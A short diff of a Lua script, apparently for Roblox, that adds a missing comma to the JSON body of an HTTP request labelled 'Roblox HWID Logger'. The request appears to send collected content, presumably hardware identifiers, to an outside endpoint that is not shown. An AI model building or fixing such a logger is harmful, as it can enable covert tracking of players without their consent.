@@ -27,7 +27,7 @@ request{
         ["Content-Type"] = "application/json"  -- When sending JSON, set this!
     },
     Body = Services.HttpService:JSONEncode({
-        content = content
+        content = content,
         username = "Roblox HWID Logger"
     })
 }
